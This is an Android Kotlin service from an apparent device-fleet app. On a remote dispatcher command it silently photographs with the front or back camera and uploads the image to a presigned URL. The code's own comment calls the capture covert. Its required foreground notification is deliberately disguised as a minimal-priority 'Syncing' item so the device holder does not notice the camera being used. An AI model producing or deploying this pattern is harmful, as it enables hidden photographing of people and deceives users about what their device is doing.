package io.sonalit.guardian.service

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import dagger.hilt.android.AndroidEntryPoint
import io.sonalit.guardian.R
import io.sonalit.guardian.data.remote.GuardianApi
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import javax.inject.Inject

/**
 * Covertly captures a single still on a dispatcher's capture_photo command and
 * uploads it — the lightweight substitute for the old Knox remote screen/control
 * (see PR #171 for the backend + Live Fleet display).
 *
 * A camera-typed foreground service is required to touch the camera at all from
 * the background on modern Android. Even so, Android 12+ restricts *starting* a
 * background foreground service, so the caller (CommandExecutor) starts this
 * best-effort inside a runCatching and this class degrades gracefully — logging
 * and stopping — rather than crashing if the OS denies the start or the capture.
 *
 * Implemented as a plain Service that is its own LifecycleOwner (via
 * LifecycleRegistry) so CameraX's bindToLifecycle has an owner without pulling
 * in the androidx lifecycle-service artifact, which this module doesn't depend on.
 */
@AndroidEntryPoint
class PhotoCaptureService : Service(), LifecycleOwner {

    @Inject lateinit var api: GuardianApi
    @Inject lateinit var okHttp: OkHttpClient

    private val registry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = registry

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var finished = false

    override fun onCreate() {
        super.onCreate()
        registry.currentState = Lifecycle.State.CREATED
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            startForegroundDiscreet()
        } catch (e: Exception) {
            // ForegroundServiceStartNotAllowedException on a background start, etc.
            Log.e(TAG, "startForeground denied: ${e.message}")
            stopSelfSafely()
            return START_NOT_STICKY
        }
        registry.currentState = Lifecycle.State.STARTED
        val lens = intent?.getStringExtra(EXTRA_LENS) ?: "back"
        capture(lens)
        return START_NOT_STICKY
    }

    private fun capture(lens: String) {
        val selector = if (lens == "front") CameraSelector.DEFAULT_FRONT_CAMERA
                       else CameraSelector.DEFAULT_BACK_CAMERA
        val future = ProcessCameraProvider.getInstance(this)
        future.addListener({
            val provider = try {
                future.get()
            } catch (e: Exception) {
                Log.e(TAG, "camera provider unavailable: ${e.message}"); stopSelfSafely(); return@addListener
            }
            val imageCapture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .build()
            try {
                provider.unbindAll()
                provider.bindToLifecycle(this, selector, imageCapture)
            } catch (e: Exception) {
                Log.e(TAG, "bindToLifecycle failed: ${e.message}"); stopSelfSafely(); return@addListener
            }

            val file = File(cacheDir, "capture_${System.currentTimeMillis()}.jpg")
            val opts = ImageCapture.OutputFileOptions.Builder(file).build()
            imageCapture.takePicture(opts, ContextCompat.getMainExecutor(this),
                object : ImageCapture.OnImageSavedCallback {
                    override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                        runCatching { provider.unbindAll() }
                        scope.launch {
                            runCatching { uploadAndReport(file) }
                                .onFailure { Log.e(TAG, "capture upload failed: ${it.message}") }
                            runCatching { file.delete() }
                            stopSelfSafely()
                        }
                    }

                    override fun onError(exc: ImageCaptureException) {
                        Log.e(TAG, "takePicture error: ${exc.message}")
                        runCatching { provider.unbindAll() }
                        stopSelfSafely()
                    }
                })
        }, ContextCompat.getMainExecutor(this))
    }

    private suspend fun uploadAndReport(file: File) {
        if (!file.exists() || file.length() == 0L) throw IllegalStateException("empty capture file")
        val presign = api.capturePhotoUrl()
        val put = Request.Builder()
            .url(presign.upload_url)
            .put(file.asRequestBody("image/jpeg".toMediaType()))
            .build()
        okHttp.newCall(put).execute().use { resp ->
            if (!resp.isSuccessful) error("R2 PUT failed: ${resp.code}")
        }
        api.capturePhoto(mapOf("public_url" to presign.public_url, "key" to presign.key))
    }

    private fun startForegroundDiscreet() {
        val channelId = "capture"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getSystemService(NotificationManager::class.java).createNotificationChannel(
                NotificationChannel(channelId, "Sync", NotificationManager.IMPORTANCE_MIN)
            )
        }
        // A foreground-service notification is mandatory on stock Android — kept
        // generic/low-key since the capture itself is meant to be unobtrusive.
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Syncing")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
        // FOREGROUND_SERVICE_TYPE_CAMERA is API 30+; below that fall back to a
        // plain foreground service (camera-from-background is an edge case there).
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            startForeground(NOTIF_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(NOTIF_ID, notification)
        }
    }

    private fun stopSelfSafely() {
        if (finished) return
        finished = true
        runCatching {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) stopForeground(STOP_FOREGROUND_REMOVE)
            else @Suppress("DEPRECATION") stopForeground(true)
        }
        stopSelf()
    }

    override fun onDestroy() {
        registry.currentState = Lifecycle.State.DESTROYED
        runCatching { scope.cancel() }
        super.onDestroy()
    }

    companion object {
        private const val TAG = "PhotoCaptureService"
        private const val NOTIF_ID = 42
        const val EXTRA_LENS = "lens"
    }
}
